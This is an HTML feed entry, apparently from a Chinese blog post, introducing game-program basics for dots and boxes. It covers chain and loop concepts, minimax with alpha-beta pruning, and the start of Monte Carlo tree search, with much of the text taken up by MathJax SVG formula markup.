    <content type="html"><![CDATA[<p>写一些博弈相关的东西</p><span id="more"></span><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p>点格棋由$6<em>6<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="11.312ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 5000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">点</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">构</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">成</text></g></g></g></svg></mjx-container>5</em>5$的格子，整个局面一共25个格子和60条边。</p><p>游戏规则：四条边围住一个格子，这个格子归属于放下最后一条边的一方，当最终棋盘被填满时，占据格子多的一方获胜。</p><p><strong>长链</strong>：一系列尚未被完全围住的正方形（通常只有两条边），这些正方形共享边，形成一个连续的链条状结构。如下图</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/image-20240905164925237.png" class=""><p><strong>打开长链</strong>：当一方使得长链正方形中的某一个正方形构成了3边，就会形成死树，那么其对手方将获会占据所有长链正方形。</p><p><strong>死树</strong>：一个已经形成的长链状结构，只差一条边就可以完成并将所有包含的正方形“吃完”（即完成所有正方形，获得分数和额外回合）。死树非常接近完成，但当前回合的玩家不愿意去画最后那条边，因为这样做会给对手带来大量得分。</p><p><strong>环</strong>：若干个正方形围成的闭合结构，即它们的边已经被画满，形成一个封闭的回路。</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/image-20240905165026155.png" class=""><p><strong>让格</strong>：通过不主动完成某些正方形，让对手先操作一些边线，从而为自己留下更有利的操作空间。</p><h3 id="alpha-beta剪枝"><a href="#alpha-beta剪枝" class="headerlink" title="alpha&beta剪枝"></a>alpha&amp;beta剪枝</h3><p>树结构定义：</p><p>每个节点表示此时的赢面</p><p>根节点表示我方赢面</p><p>父节点到子节点表示执棋方落子一步，故以我方为根节点，则奇数层为我方赢面，偶数层为敌方赢面</p><p>搜索深度就是树的深度</p><p>最大最小算法：</p><p>​根据树结构定义，我们显然要在奇数层获取最大赢面，对手会在偶数层使得我们走向最小赢面。故我们在偶数层填入子节点中的最小值，称为MIN节点，在奇数层填写子节点中的最大值，称为MAX节点。</p><p>剪枝：</p><p>​上述算法需要遍历整个博弈树，我们发现在遍历博弈树的过程中，我们的赢面情况是在不断变化的，所以我们可以记录当前赢面的范围，从而规避掉不必要的搜索路径。<code>alpha</code>表示此时可以获得的最大赢面，<code>beta</code>表示此时我方受到敌方行棋限制（根据先前的搜索结果敌方可以导向我方选择路径）后可以获得的最大赢面，当<code>alpha</code>大于等于<code>beta</code>时，剪掉后续路径。<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="24.315ex" height="2.009ex" role="img" focusable="false" viewBox="0 -694 10747.1 888"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(529,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(827,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1330,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1906,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2712.8,0)"><g data-mml-node="text"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="text" transform="translate(778,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g></g><g data-mml-node="mi" transform="translate(4546.6,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(5015.6,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(5448.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5933.6,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(6384.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(7128.3,0)"><g data-mml-node="text"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="text" transform="translate(778,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g></g><g data-mml-node="mi" transform="translate(8962.1,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(9391.1,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(9857.1,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(10218.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container><br>回溯过程中存在三种状态：</p><ol><li>初始状态：通过父节点向下传递<code>alpha</code>和<code>beta</code>的值</li><li>左子树回溯结果：如果是MAX节点，则更改<code>alpha</code>的值，需要满足值大于原<code>alpha</code>，否则不用更改；如果是MIN节点，则更改<code>beta</code>的值，需要满足值小于原<code>beta</code>，否则不用更改</li><li>回溯结果：即右子树回溯，</li></ol><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/Snipaste_2024-05-16_17-35-06.png" class=""><h3 id="蒙特卡洛树搜索"><a href="#蒙特卡洛树搜索" class="headerlink" title="蒙特卡洛树搜索"></a>蒙特卡洛树搜索</h3><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.618ex;" xmlns="http://www.w3.org/2000/svg" width="24.504ex" height="4.767ex" role="img" focusable="false" viewBox="0 -950 10830.9 2107.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(2021.5,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(535,-1050) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3632.2,0)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(833,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(1222,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,413) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2486.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2875.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(3404.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3793.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(4238.2,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5502.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5891.8,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6420.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6809.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></svg></mjx-container></p><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="19.933ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 8810.2 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2182.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 